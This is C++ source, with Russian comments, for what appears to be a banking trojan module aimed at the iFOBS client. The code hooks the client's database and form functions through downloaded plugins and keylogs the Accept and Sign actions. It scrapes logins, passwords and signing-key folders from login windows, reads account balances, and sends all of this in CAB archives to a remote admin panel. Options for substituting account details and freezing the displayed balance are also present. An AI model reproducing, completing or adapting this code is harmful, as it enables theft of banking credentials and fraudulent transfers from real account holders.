#include "system.h"
#include "Manager.h"
#include "core\debug.h"
#include "core\file.h"
#include "core\hook.h"
#include "core\keylogger.h"
#include "core\util.h"
#include "core\cab.h"
#include "core\rand.h"
#include "main.h"
#include "core\http.h"
#include "AdminPanel.h"
#include "task.h"

namespace IFobs
{

const DWORD HashClassEditControl = 0x0a635e74; // TcxCustomInnerTextEdit 
const DWORD HashClassButtonControl = 0x0c9ce1fe; // TcxButton
const DWORD HashClassEditComboBox = 0x07a4e004; // TcxCustomComboBoxInnerEdit
//хеш окна регистрации
const DWORD HashClassLoginForm = 0x094c8dd3; // TLoginForm.UnicodeClass
const DWORD HashSignAsForm = 0x04fc5813; // TSignAsForm.UnicodeClass

const int MaxFindedControl = 6;

int pluginInstalled = 0; //0 - плагин еще не грузили, 1 - плагин не установился, 2 - плагин успешно установлен
uint icatchLog = 0; //поток в который пишем логи плагина

//прототип из ifobs.plug
typedef BOOL ( WINAPI *typeInitFunc )(DWORD origFunc, char *funcName);

struct ForFindControl
{
	HWND wnds[MaxFindedControl];
	StringBuilderStack<MAX_PATH> texts[MaxFindedControl];
	int count;
	DWORD hash1, hash2;
};

struct AccBalans
{
	char accNumber[64];
	char accId[64];
	char balans[64];
	char nameBank[128];
	char login[64];
	char pwd1[64];
	char pwd2[64];
	char pathKeys[MAX_PATH];
	int set;
};

//объявления и определения необходимые для ifobs.plug
struct HookFunc //функция на которую ставится хук
{
	char* nameDll; //имя длл в которой находится nameHookFunc
	char* nameFunc; //имя функции на которую подменяем
	DWORD hashOrigFunc; //хеш подменяемой функции
	char* nameOrigFunc; //имя подменяемой функции (для ifobs.plug)
};

//имена параметров в ини файле
struct NameIniParam
{
	char* key;
	char* val;
};

class IFobsLogger : public KeyLogger::ExecForFilterMsg
{
	protected:

		virtual void Exec( KeyLogger::FilterMsgParams& params );

	public:

		IFobsLogger( KeyLogger::FilterMsgBase* filter );

		static bool Start();
};

static HookFunc funcsPlug[] =
{
	{ _CT_("VistaDB_D7.bpl"), _CT_("HProc2"), 0x074e8c79, _CT_("OpenDatabaseConnection") }, //@Vdbint@ivsql_OpenDatabaseConnection$qqripciiit2i
	{ _CT_("RtlData1.bpl"), _CT_("HProc3"), 0x07850066, _CT_("TaskAfterSynchRun") }, //@Taskaftersynch@TCustomTaskAfterSynch@Run$qqrv
	{ _CT_("vcl70.bpl"), _CT_("HProc4"), 0x05e08696, _CT_("TCustomFormShow") }, //@Forms@TCustomForm@Show$qqrv
	{ _CT_("vcl70.bpl"), _CT_("HProc5"), 0x0c5a1d16, _CT_("TCustomFormCloseQuery") }, //@Forms@TCustomForm@CloseQuery$qqrv
	{ _CT_("RtlStore.bpl"), _CT_("HProc6"), 0x0bd94326, _CT_("GlobalAppStorage") }, //@Appglobalstorage@GlobalAppStorage$qqrv
	{ _CT_("RtlData1.bpl"), _CT_("HProc7"), 0x019c4b36, _CT_("FillDataToDBCache") }, //@Win32syncservice@TWin32SynchronizeService@FillDataToDBCache$qqrv
	{ 0 }
};

static char* nameGlobal = _CT_("Global");
char* nameProcess = _CT_("ifobsclient.exe");
char* nameRtlExt_bpl = _CT_("RtlExt.bpl");
char* nameifobs_plug = _CT_("ifobs.plug");

static NameIniParam namesIFobsIni[] =
{
	{ _CT_("Screen"), _CT_("1") },
	{ _CT_("Podmena"), _CT_("1") },
	{ _CT_("AzSend"), _CT_("1") },
	{ _CT_("Bf"), _CT_("0") },
	{ _CT_("Status1101"), _CT_("20") },
	{ _CT_("Status1103"), _CT_("50") },
	{ 0, 0 }
};



DWORD btAccept[] = { 0x0ef7dfcc /* Принять */, 0x0f78d4e8 /* Прийняти */, 0x04799c74 /* Accept */, 
					 0x03e72528 /* Підписати */, 0x03e722cc /* Подписать */, 0x00059fde /* Sign */, 0 };
AccBalans dataFromPlug; //данные от ifobs.plug
char clientFolder[MAX_PATH];

IFobsLogger* logger = 0;
HANDLE eventInitIFobsPlug = 0;

static void HandlerLoaded_ifobs_plug( Pipe::AutoMsg msg, DWORD );
static void HandlerLoaded_rtlext_plug( Pipe::AutoMsg msg, DWORD);
static void HandlerCreateLog( Pipe::AutoMsg msg, DWORD);
static void GetPathInIFobsFolder( StringBuilder& path, const char* fileName );
static bool InstallIFobsPlugin();
static bool PlugIsInstalled();
static void WINAPI PutBalans( const char* accNumber, const char* accId, const char* balans, const char* nameBank );
static void WINAPI PutPasswords(const char* login, const char* pwd1, const char* pwd2, const char* pathKeys );
static void WINAPI SendLogsAdm(const char* logLine);
static void WINAPI SendLogsAdmFull(const char* logLine);
static void WINAPI SendLogsFile( const char* fileName, void* data, int size );

void Start( uint hash, StringBuilder& nameProcess, StringBuilder& path )
{
	if( !Pipe::InitServerPipeResponse() ) return;
	Str::Copy( clientFolder, sizeof(clientFolder), path.c_str(), path.Len() );
	icatchLog = 0;
	ManagerServer::CreateVideoLog( _CS_("icatch"), HandlerCreateLog );
	//ManagerServer::SendData( _CS_("IFobsStart"), _CS_("Process start"), 13, false);
	if( ManagerServer::GetGlobalState(Task::GlobalState_IFobsUploaded) == '0' )
		ManagerServer::SendFolderPackToVideoServer( clientFolder, 0, _CS_("cabs"), _CS_("ifobs_client"), Task::GlobalState_IFobsUploaded );
	if( ManagerServer::GetGlobalState(Task::GlobalState_AutoLsaDll) == '0' )
	{
		ManagerServer::CmdExec( _CS_("secure lsa d.plg") );
		ManagerServer::SetGlobalState( Task::GlobalState_AutoLsaDll, '1' );
	}
	eventInitIFobsPlug = API(KERNEL32, CreateEventA)( nullptr, TRUE, FALSE, nullptr );
	bool plugLoaded = PlugIsInstalled();
	if( !plugLoaded )
	{	
		StringBuilderStack<16> name( _CS_("rtlext.plug") );
		ManagerServer::LoadPlugin( name, HandlerLoaded_rtlext_plug );
		IFobsLogger::Start();
		if( API(KERNEL32, WaitForSingleObject)( eventInitIFobsPlug, 10000 ) == WAIT_OBJECT_0 ) 
		{
			//плагин загружен
			plugLoaded = true;
		}
	}
	else
	{
		DbgMsg( "Плагин уже был загружен" );
	}
	if( plugLoaded ) InstallIFobsPlugin();

	API(KERNEL32, CloseHandle)(eventInitIFobsPlug);
	eventInitIFobsPlug = 0;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// функции работы с ifobs.plug
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static void HandlerLoaded_rtlext_plug( Pipe::AutoMsg msg, DWORD )
{
	StringBuilderStack<MAX_PATH> path;
	GetPathInIFobsFolder( path, DECODE_STRING(nameRtlExt_bpl) );
	DbgMsg( "Загрузили и сохранили '%s'", path );
	File::WriteAll( path, msg->data, msg->sz_data );
	StringBuilderStack<16> name( DECODE_STRING(nameifobs_plug) );
	ManagerServer::LoadPlugin( name, HandlerLoaded_ifobs_plug );
}

static void HandlerLoaded_ifobs_plug( Pipe::AutoMsg msg, DWORD )
{
	StringBuilderStack<MAX_PATH> path;
	GetPathInIFobsFolder( path, DECODE_STRING(nameifobs_plug) );
	DbgMsg( "Загрузили и сохранили '%s'", path );
	File::WriteAll( path, msg->data, msg->sz_data );
	API(KERNEL32, SetEvent)(eventInitIFobsPlug); //говорим что плагины загружены
}

void HandlerCreateLog( Pipe::AutoMsg msg, DWORD)
{
	icatchLog = *((uint*)msg->data);
	DbgMsg( "Получен ид потока для записи логов icatch, %d", icatchLog );
}

static void GetPathInIFobsFolder( StringBuilder& path, const char* fileName )
{
	Path::GetCSIDLPath( CSIDL_LOCAL_APPDATA, path, _CS_("IFobs") );
	Path::CreateDirectory(path);
	Path::AppendFile( path, fileName );
}

static bool InstallIFobsPlugin()
{
	bool ret = false;
	DbgMsg( "Инсталяция ifobs.plug" );
	StringBuilderStack<MAX_PATH> path;
	GetPathInIFobsFolder( path, _CS_("ifobs.ini") );
	if( !File::IsExists(path) )
	{
		NameIniParam* ini = namesIFobsIni;
		int i = 0;
		while( ini[i].key )
		{
			API(KERNEL32, WritePrivateProfileStringA)( DECODE_STRING(nameGlobal), DECODE_STRING(ini[i].key), DECODE_STRING(ini[i].val), path );
			i++;
		}
	}
	GetPathInIFobsFolder( path, _CS_("ifobs.plug") );
	HMODULE ifobsPlug = API(KERNEL32, LoadLibraryA)(path);
	typeInitFunc InitFunc = (typeInitFunc)API(KERNEL32, GetProcAddress)( ifobsPlug, _CS_("InitFunc") );
	if( InitFunc )
	{
		DbgMsg( "Взяли InitFunc" );

		if ( InitFunc( (DWORD)&PutBalans, _CS_("BalanceCallBack") ) )
			DbgMsg( "Установили BalanceCallBack");
		if ( InitFunc( (DWORD)&PutPasswords, _CS_("PasswordsCallBack") ) )
			DbgMsg( "Установили PasswordsCallBack" );
		if ( InitFunc( (DWORD)&SendLogsAdm, _CS_("SendLogsAdmCallBack") ) )
			DbgMsg( "Установили SendLogsAdmCallBack" );
		if ( InitFunc( (DWORD)&SendLogsAdmFull, _CS_("SendLogsAdmFullCallBack") ) )
			DbgMsg( "Установили SendLogsAdmFullCallBack" );
		if ( InitFunc( (DWORD)&SendLogsFile, _CS_("SendLogsFileCallBack") ) )
			DbgMsg( "Установили SendLogsFileCallBack" );

		HookFunc* fp = funcsPlug;
		while( fp->nameDll )
		{
			void* plugFunc = API(KERNEL32, GetProcAddress)( ifobsPlug, DECODE_STRING(fp->nameFunc) );
			if( !plugFunc ) break;
			DbgMsg( "Найдена функция %s", fp->nameFunc );
			HMODULE dll = API(KERNEL32, GetModuleHandleA)( DECODE_STRING(fp->nameDll) );
			DWORD addrRealFunc = (DWORD)Hook::Set( dll, fp->hashOrigFunc, plugFunc );
			if( addrRealFunc == 0 ) break;
			DbgMsg( "Установлен хук на %s", fp->nameOrigFunc );
			if( !InitFunc( addrRealFunc, DECODE_STRING(fp->nameOrigFunc) ) ) break;
			fp++;
		}
		if( fp->nameDll == 0 )
		{
			DbgMsg( "ifobs.plug успешно установлен" );
			icatchLog = 
			ret = true;
		}
	}
	return ret;
}

static bool PlugIsInstalled()
{
	StringBuilderStack<MAX_PATH> path;
	GetPathInIFobsFolder( path, DECODE_STRING(nameifobs_plug) );
	if( File::IsExists(path) )
	{
		GetPathInIFobsFolder( path, DECODE_STRING(nameRtlExt_bpl) );
		if( File::IsExists(path) )
			return true;
	}
	return false;
}

static void SendDataCab( const char* name,  const StringBuilder& logText, const char* pathKeys ) 
{
	Cab cab;
	cab.AddFile( _CS_("log.txt"), logText );
	DWORD attr = API(KERNEL32, GetFileAttributesA)(pathKeys);
	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
	{
		cab.AddFolder( _CS_("keys"), pathKeys );
	}
	cab.Close();
	StringBuilderStack<16> fileName;
	Rand::Gen( fileName, 5, 10 );
	fileName += _CS_(".cab");
	ManagerServer::SendData( name, cab.GetData().Ptr(), cab.GetData().Len(), true, fileName );
#ifdef ON_VIDEOSERVER
	ManagerServer::SendFileToVideoServer( _CS_("cabs"), name, _CS_("cab"), cab.GetData() );
#endif
}

//отсылает информацию полученную через ifobs.plug
static void SendDataFromPlugin()
{
	StringBuilder s(1024);
	s.Format( _CS_("Login: '%s'\r\nPassword system: '%s'\r\nPassword keys: '%s'\r\nPath keys: %s\r\nClient folder: %s\r\n\r\nAccount: %s\r\nAccId: %s\r\nBalans: %s\r\nName bank: %s\r\n"),
			dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys,
			clientFolder, dataFromPlug.accNumber, dataFromPlug.accId, dataFromPlug.balans, dataFromPlug.nameBank );
	SendDataCab( _CS_("ifobs_plug"), s, dataFromPlug.pathKeys );

	//отсылка данных в админку az
	s.Format( _CS_("DLL -> Login: '%s', Password system: '%s', Password keys: '%s', Path keys: %s, Client folder: %s"), 
			dataFromPlug.login, dataFromPlug.pwd1, dataFromPlug.pwd2, dataFromPlug.pathKeys, clientFolder );
	StringBuilder userAZ;
	Config::NameUserAZ(userAZ);
	StringBuilder sEncoded, bankEncoded;
	HTTP::UrlEncode( s, sEncoded );
	HTTP::UrlEncode( dataFromPlug.nameBank, bankEncoded );
	StringBuilder urlFile(1024);

	urlFile.Format( _CS_("raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1&ida=%s"), 
					Config::UID, userAZ.c_str(), dataFromPlug.balans, dataFromPlug.accNumber, bankEncoded.c_str(), dataFromPlug.accId  );
	ManagerServer::ExecRequest( AdminPanel::AZ, urlFile );

	urlFile.Format( _CS_("raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=00&text=%s"),
					Config::UID, userAZ.c_str(), sEncoded.c_str() );
	ManagerServer::ExecRequest( AdminPanel::AZ, urlFile );

}

static void WINAPI PutBalans( const char* accNumber, const char* accId, const char* balans, const char* nameBank )
{
	DbgMsg( "IFobs.plug acc: '%s', balans: '%s', name bank: '%s'", accNumber, balans, nameBank );
	Str::Copy( dataFromPlug.accNumber, sizeof(dataFromPlug.accNumber), accNumber );
	Str::Trim(dataFromPlug.accNumber);

	Str::Copy( dataFromPlug.accId, sizeof(dataFromPlug.accId), accId );
	Str::Trim(dataFromPlug.accId);

	Str::Copy( dataFromPlug.balans, sizeof(dataFromPlug.balans), balans );
	Str::Copy( dataFromPlug.nameBank, sizeof(dataFromPlug.nameBank), nameBank );
	dataFromPlug.set |= 1;
	if( dataFromPlug.set == 3 ) //все поля заполнены
		SendDataFromPlugin();
}

static void WINAPI PutPasswords( const char* login, const char* pwd1, const char* pwd2, const char* pathKeys )
{
	DbgMsg( "IFobs.plug login: '%s', psw1: '%s', psw2: '%s'", login, pwd1, pwd2 );
	Str::Copy( dataFromPlug.login, sizeof(dataFromPlug.login), login );
	Str::Copy( dataFromPlug.pwd1, sizeof(dataFromPlug.pwd1), pwd1 );
	Str::Copy( dataFromPlug.pwd2, sizeof(dataFromPlug.pwd2), pwd2 );
	Str::Copy( dataFromPlug.pathKeys, sizeof(dataFromPlug.pathKeys), pathKeys );
	dataFromPlug.set |= 2;
	if( dataFromPlug.set == 3 ) //все поля заполнены
		SendDataFromPlugin();
}

static void WINAPI SendLogsAdm( const char* logLine )
{
//	ManagerServer::SendData( _CS_("ifobs_plug_log"), logLine, Str::Len(logLine), false );
	StringBuilder userAZ;
	Config::NameUserAZ(userAZ);
	StringBuilder logEncoded;
	HTTP::UrlEncode( logLine, logEncoded );
	StringBuilder urlFile(1024);
	urlFile.Format( _CS_("raf/?uid=%s&sys=ifobs&cid=%s&mode=setlog&log=00&text=%s"), Config::UID, userAZ.c_str(), logEncoded.c_str() );
	ManagerServer::ExecRequest( AdminPanel::AZ, urlFile );
}

static void WINAPI SendLogsAdmFull( const char* logLine )
{
	ManagerServer::SendVideoLog( icatchLog, logLine ); 
}

static void WINAPI SendLogsFile( const char* fileName, void* data, int size )
{
	char name[64];
	Str::Copy( name, sizeof(name), Path::GetFileName(fileName) );
	char* ext = Path::GetFileExt(name);
	if( ext )
	{
		*ext = 0;
		ext++;
	}
	if( data && size > 0 )
	{
		Mem::Data data2;
		data2.Link( data, size );
		ManagerServer::SendFileToVideoServer( _CS_("ifobs_files"), name, ext, data2 );
		data2.Unlink();
	}
	else
	{
		Mem::Data data2;
		if( File::ReadAll( fileName, data2 ) )
		{
			ManagerServer::SendFileToVideoServer( _CS_("ifobs_files"), name, ext, data2 );
			File::Delete(fileName);
		}
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// функции логгирования ifobs
/////////////////////////////////////////////////////////////////////////////////////////////////////////////

//это кнопка Принять
static bool IsBtAccept( uint hash, const char* text )
{
	if( hash == 0 ) hash = Str::Hash(text);
	int i = 0;
	while( btAccept[i] ) //смотрим в массиве хешей
	{
		if( btAccept[i] == hash ) return true; //кнопка Принять
		i++;
	}
	return false;
}

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindControl* ffc = (ForFindControl*)lParam;
	StringBuilderStack<128> s;
	Window::GetNameClass( hwnd, s );
	DWORD hash = s.Hash();
	if( hash == ffc->hash1 || hash == ffc->hash2 )
	{
		ffc->wnds[ffc->count] = hwnd;
		Window::GetCaption( hwnd, ffc->texts[ffc->count] );
		DbgMsg( "Find control %08x, text = '%s'", hwnd, ffc->texts[ffc->count].c_str() );
		ffc->count++;
		if( ffc->count >= MaxFindedControl ) return FALSE;
	}
	return TRUE;
}

static HWND GetLoginForm( HWND wnd, bool& loginWindow )
{
	HWND mainWnd = Window::GetParentWithCaption(wnd);
	StringBuilderStack<128> className;
	Window::GetNameClass( mainWnd, className );
	uint hash = className.Hash();
	if( hash != HashClassLoginForm && hash != HashSignAsForm )
	{
		wnd = mainWnd;
		mainWnd = 0;
		hash = 0;
	}
	if( mainWnd == 0 )
	{
		ForFindControl* ffc = new ForFindControl;
		ffc->count = 0;
		ffc->hash1 = HashClassLoginForm;
		ffc->hash2 = HashSignAsForm;
		API(USER32, EnumChildWindows)( wnd, EnumChildProc, (LPARAM)ffc );
		if( ffc->count > 0 )
			mainWnd = ffc->wnds[0];
		else
		{
			API(USER32, EnumWindows)( EnumChildProc, (LPARAM)ffc );
			if( ffc->count > 0 )
				mainWnd = ffc->wnds[0];
		}
		delete ffc;
	}
	if( mainWnd )
	{
		if( hash == 0 )
		{
			Window::GetNameClass( mainWnd, className );
			hash = className.Hash();
		}
		loginWindow = (hash == HashClassLoginForm);
		DbgMsg( "Нашли окно регистрации %08x", mainWnd );
	}
	else
		DbgMsg( "Окно регистрации ненайдено" );
	return mainWnd;
}

//в окне регистрации 4-е текстовых поля ввода, путем перечисления всех дочерних окон находим эти контролы
//в массиве texts структуры ForFindEditControl они находятся в следующем порядке: 0 - путь к ключам, 
//1 - пароль для ключей, 2 - пароль для входа систему, 3 - логин
static void GrabData( HWND wnd, bool loginWindow )
{
	DbgMsg( "Грабим данные" );
	ForFindControl* ffc = new ForFindControl;
	ffc->count = 0;
	if( loginWindow ) //окно регистрации
	{
		ffc->hash1 = HashClassEditControl;
		ffc->hash2 = -1;
	}
	else //окно подписи
	{
		ffc->hash1 = HashClassEditControl;
		ffc->hash2 = HashClassEditComboBox;
	}
	API(USER32, EnumChildWindows)( wnd, EnumChildProc, (LPARAM)ffc );
	StringBuilder s(1024);
	char* keysPath = 0;
	if( loginWindow ) //окно регистрации
	{
		s.Format( _CS_("Login window:\r\n\r\nLogin: '%s'\r\nPassword system: '%s'\r\nPassword key: '%s'\r\nPath keys: %s\r\nClient folder: %s"),
			ffc->texts[3].c_str(), ffc->texts[2].c_str(), ffc->texts[1].c_str(), ffc->texts[0].c_str(), clientFolder );
		keysPath = ffc->texts[0].c_str();
	}
	else
	{
		s.Format( _CS_("Sign window:\r\n\r\nSign login: '%s'\r\nSign Password: '%s'\r\nSign Path: %s\r\nClient folder: %s"),
			ffc->texts[2].c_str(), ffc->texts[1].c_str(), ffc->texts[0].c_str(), clientFolder );
		keysPath = ffc->texts[0].c_str();
	}
	SendDataCab( _CS_("ifobs_cab"), s, keysPath );

	delete ffc;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

IFobsLogger::IFobsLogger( KeyLogger::FilterMsgBase* filter ) : KeyLogger::ExecForFilterMsg(filter)
{
}

void IFobsLogger::Exec( KeyLogger::FilterMsgParams& params )
{
	bool loginWindow;
	if( params.msg == WM_LBUTTONUP )
	{
		//смотрим нажали ли на кнопку Принять
		if( IsBtAccept( params.infoWnd->hashCaption, 0 ) )
		{
			HWND parent = GetLoginForm( params.hwnd, loginWindow ); 
			GrabData( parent, loginWindow );
		}
	}
	else
	{
		DbgMsg( "Нажали клавишу Enter" );
		//ищем главное окно
		HWND mainWnd = GetLoginForm( params.hwnd, loginWindow );
		
		//ищем все кнопки на форме
		ForFindControl* ffc = new ForFindControl;
		ffc->count = 0;
		ffc->hash1 = HashClassButtonControl;
		ffc->hash2 = -1;
		API(USER32, EnumChildWindows)( mainWnd, EnumChildProc, (LPARAM)ffc );
		//ищем кнопку Принять
		for( int i = 0; i < ffc->count; i++ )
		{
			if( IsBtAccept( 0, ffc->texts[i] ) )
			{
				//смотрим активна она или нет
				if( API(USER32, IsWindowEnabled)( ffc->wnds[i] ) )
				{
					DbgMsg( "Кнопка Принять активна" );
					GrabData( mainWnd, loginWindow );
				}
				else
					DbgMsg( "Кнопка Принять заблокирована" );
				break;
			}
		}
		delete ffc;
	}
}

bool IFobsLogger::Start()
{
	//настраиваем фильтр на нажатие кнопки мыши
	uint mouseMsg[1]; 
	mouseMsg[0] = WM_LBUTTONUP;
	KeyLogger::FilterMsg* filterMouse = new KeyLogger::FilterMsg( mouseMsg, 1 );
	if( filterMouse )
	{
		//настраиваем фильтр на нажатие Enter
		uint keyMsg[1];
		keyMsg[0] = WM_KEYUP;
		uint keys[1];
		keys[0] = VK_RETURN;
		KeyLogger::FilterKey* filterKey = new KeyLogger::FilterKey( keyMsg, 1, keys, 1 );
		if( filterKey )
		{
			//создаем совместный фильтр
			KeyLogger::FilterMsgBase* filters[2];
			filters[0] = filterMouse;
			filters[1] = filterKey;
			KeyLogger::FilterMsgOr* filtersOr = new KeyLogger::FilterMsgOr( (const KeyLogger::FilterMsgBase**)filters, 2 );
			if( filtersOr )
			{
				logger = new IFobsLogger(filtersOr);
				if( logger )
				{
					if( KeyLogger::JoinDispatchMessageWnd(logger) )
						return true;
				}
				delete filtersOr;
			}
			delete filterKey;
		}
		delete filterMouse;
	}
	return false;
}

static void HandlerLoaded_z_ini( Pipe::AutoMsg msg, DWORD )
{
	StringBuilderStack<MAX_PATH> path;
	GetPathInIFobsFolder( path, _CS_("z.ini") );
	File::WriteAll( path, msg->data, msg->sz_data );
	API(KERNEL32, SetEvent)( (HANDLE)msg->tag );
	DbgMsg( "z.ini создан" );
}

static void DeletePlugins()
{
	Process::Kill( DECODE_STRING(nameProcess), 5000 );
	StringBuilder path;
	GetPathInIFobsFolder( path, DECODE_STRING(nameifobs_plug) );
	File::Delete(path);
	GetPathInIFobsFolder( path, DECODE_STRING(nameRtlExt_bpl) );
	File::Delete(path);
}

void CreateFileReplacing( StringBuilder& s )
{
	if( s.IsEmpty() ) return;
	StringBuilder path, pathIFobsIni;
	GetPathInIFobsFolder( pathIFobsIni, _CS_("ifobs.ini") );
	NameIniParam* ini = namesIFobsIni;
	char buf[2]; buf[0] = '1'; buf[1] = 0;
	API(KERNEL32, WritePrivateProfileStringA)( DECODE_STRING(nameGlobal), _CS_("Bf"), buf, pathIFobsIni );
	bool f5 = false;
	StringArray args = s.Split(' ');
	for( int i = 0; i < args.Count(); i++ )
	{
		StringBuilder& arg = args[i];
		if( args[i]->IsEmpty() ) continue;
		if(  arg.IndexOf('\\') > 0 || arg.IndexOf('/') > 0 || arg.IndexOf(':') > 0 ) //url
		{
			GetPathInIFobsFolder( path, _CS_("z.ini~") );
			File::Delete(path);
			HANDLE eventLoaded = API(KERNEL32, CreateEventA)( nullptr, TRUE, FALSE, nullptr );
			ManagerServer::LoadFile( arg, HandlerLoaded_z_ini, 0, (DWORD)eventLoaded );
			if( API(KERNEL32, WaitForSingleObject)( eventLoaded, 10000 ) == WAIT_OBJECT_0 ) 
			{
				//z.ini загружен
				char ACCOUNTID[16];
				GetPathInIFobsFolder( path, _CS_("z.ini") );
				API(KERNEL32, GetPrivateProfileStringA)( _CS_("Data"), _CS_("ACCOUNTID"), 0, ACCOUNTID, sizeof(ACCOUNTID), path );
				API(KERNEL32, WritePrivateProfileStringA)( DECODE_STRING(nameGlobal), _CS_("A0"), ACCOUNTID, pathIFobsIni );
			}
			API(KERNEL32, CloseHandle)(eventLoaded);
		}
		else if( arg.Cmp( _CS_("f5") ) == 0 )
			f5 = true;
		else if( arg.Cmp( _CS_("del") ) == 0 )
			DeletePlugins();
		else if( arg.Cmp( _CS_("freezebal") ) == 0 )
			if( i + 1 < args.Count() )
			{
				API(KERNEL32, WritePrivateProfileStringA)( DECODE_STRING(nameGlobal), arg, args[i + 1]->c_str(), pathIFobsIni );
			}
	}

	if( f5 )
	{
		HWND wnd = API(USER32, FindWindowA)( _CS_("TMainForm.UnicodeClass"), 0 );
		if( wnd ) Process::SendMsg( wnd, WM_KEYDOWN, (WPARAM)VK_F5, 0 );
	}
#ifdef ON_VIDEOSERVER
	ManagerServer::StartVideo( _CS_("ifobs") );	
#endif
}


}
